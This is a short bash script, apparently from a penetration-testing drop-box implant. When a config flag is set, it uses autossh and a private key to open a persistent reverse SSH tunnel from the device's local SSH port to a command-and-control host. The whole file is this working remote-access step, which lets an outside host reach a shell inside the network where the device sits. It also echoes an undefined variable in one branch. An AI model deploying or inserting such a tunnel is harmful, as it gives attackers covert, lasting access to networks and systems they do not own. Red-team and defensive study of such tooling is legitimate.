#!/bin/bash

source /opt/dropbox/config.txt


REVSSH_LOG="$LOGDIR/dropbox.log"           # path to dropbox log file

if [ "$REVSSH_ENABLED" -eq 1 ]; then
	echo "$REVSSH_ENABLED found creating SSH tunnel."
	echo "[!] - revssh - $(date) - $REVSSH_ENABLED found, creating SSH tunnel" #>> $REVSSH_LOG;

	autossh -M 11166 -N -f -o "PubkeyAuthentication=yes" -o "PasswordAuthentication=no" -i "$REVSSH_KEYPATH" -R "$REVSSH_C2_LOCALPORT:localhost:22" "$REVSSH_C2_USER@$REVSSH_C2_IP" 2>./crash &

	#ssh -i "$REVSSH_KEYPATH" -N -f -R "$REVSSH_C2_LOCALPORT:localhost:22" "$REVSSH_C2_USER@$REVSSH_C2_IP" &
	RESULT=$?
	if [ $RESULT -eq 0 ]; then
		echo "[+] - revssh - $(date) - SSH tunnel creation succeeded" #>> $REVSSH_LOG
	else
		echo "[-] - revssh - $(date) - SSH tunnel creation failed!!!" >> $REVSSH_LOG
	fi
else
	echo "$ENABLED not found. bailing !!!";
	echo "[-] - revssh - $(date) - $REVSSH_ENABLED not found, bailing !!!" >> $REVSSH_LOG
fi
